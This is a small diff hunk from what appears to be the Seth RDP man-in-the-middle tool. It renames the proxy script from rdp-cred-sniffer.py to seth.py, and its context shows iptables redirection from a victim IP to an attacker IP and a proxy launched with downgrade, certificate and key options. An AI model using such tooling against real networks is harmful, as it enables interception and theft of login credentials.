@@ -128,7 +128,7 @@ set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
 
 echo "[*] Run RDP proxy..."
 
-$SCRIPT_DIR/rdp-cred-sniffer.py \
+$SCRIPT_DIR/seth.py \
     $DEBUG_FLAG -g "$SETH_DOWNGRADE" \
     -c "$CERTPATH" -k "$KEYPATH" \
     "$ORIGINAL_DEST"
